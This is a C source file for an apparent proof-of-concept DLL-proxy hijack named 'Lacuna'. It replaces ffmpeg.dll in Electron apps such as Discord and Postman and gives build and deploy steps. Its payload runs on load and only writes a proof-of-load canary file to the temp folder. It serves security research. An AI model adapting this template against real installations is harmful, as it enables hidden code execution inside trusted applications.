// Lacuna — ffmpeg.dll proxy for Electron applications
//
// ffmpeg.dll is shipped with most Electron apps for media decoding.
// Despite having 50-73 exports, it loads on startup in many apps.
//
// Tested against: Discord, Postman, Insomnia
// (Also present in: Signal, Obsidian, Bitwarden, Notion, Figma, etc.)
//
// Build:
//   x86_64-w64-mingw32-gcc -shared -o ffmpeg.dll ffmpeg_proxy.c ffmpeg_proxy.def
//
// Deploy:
//   1. Rename: ffmpeg.dll -> ffmpeg_orig.dll
//   2. Place compiled proxy as: ffmpeg.dll
//   3. Launch application
//
// NOTE: The .def file here uses Discord's export set (73 functions).
//       For apps with fewer exports (Postman has 51), the proxy still works —
//       extra forwarders for missing exports are harmless.

#include <windows.h>

void Payload(void) {
    char canaryPath[MAX_PATH];
    char evidence[512];
    char exePath[MAX_PATH] = {0};

    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
    GetTempPathA(sizeof(canaryPath), canaryPath);
    lstrcatA(canaryPath, "lacuna_canary.txt");

    SYSTEMTIME st;
    GetLocalTime(&st);
    int len = wsprintfA(evidence,
        "=== LACUNA PROOF-OF-LOAD ===\r\n"
        "Timestamp: %04d-%02d-%02d %02d:%02d:%02d\r\n"
        "Process: %s\r\n"
        "PID: %lu\r\n"
        "DLL: ffmpeg.dll (proxy)\r\n"
        "=== END PROOF ===\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        exePath, GetCurrentProcessId());

    HANDLE hFile = CreateFileA(canaryPath,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, evidence, len, &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        Payload();
    }
    return TRUE;
}
